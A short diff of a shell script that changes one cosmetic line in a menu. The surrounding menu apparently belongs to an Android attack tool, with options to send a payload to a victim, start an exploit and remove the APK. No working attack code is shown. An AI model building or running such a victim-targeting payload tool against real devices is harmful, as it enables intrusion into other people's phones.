@@ -36,7 +36,7 @@ printf "\e[1;32m01. Send the payload to your victim\e[om\n"
 printf "\e[1;32m02. Install payload in this device\e[0m\n"
 printf "\e[1;32m03. Start exploit\e[0m\n"
 printf "\e[1;32m04. Remove the apk\e[0m\n"
-printf "\e[1;32m0 Run 'quit' to exit\e[0m\n"
+printf "\e[1;32m>>Run 'quit' to exit\e[0m\n"
 echo
 printf "\e[1;36mEnter your option==> \e[1;32m"
 read option
